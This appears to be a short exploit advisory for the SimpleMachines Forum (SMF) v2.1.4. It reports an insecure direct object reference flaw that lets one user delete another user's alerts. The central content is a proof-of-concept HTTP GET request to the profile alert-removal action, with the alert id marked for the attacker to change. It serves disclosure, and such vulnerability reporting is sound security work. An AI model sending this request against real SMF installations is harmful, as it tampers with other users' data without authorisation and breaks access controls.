# Exploit Title: SMF v2.1.4 - Insecure Direct Object Reference(IDOR)
## Date: 25/7/2024
## Vendor Homepage: https://github.com/SimpleMachines/SMF
## Tested on: Debian Linux, Apache, Mysql
## Vendor: SimpleMachines
## Version: v2.1.4
## Exploit Description:
## SMF v2.1.4 suffers from IDOR - Broken Access Control Vulnerability allowing attackers to delete other user's alerts (horizontal privilege escalation).

## ---------------------------------POC-----------------------------
```
GET /index.php?action=profile;u=2;area=showalerts;do=remove;aid=4(CHANGE HERE);f05dbf50a54f=9fc74e4234f40571a49c23b1a0799b19 HTTP/1.1
Host: localhost:8410
...
Connection: keep-alive

```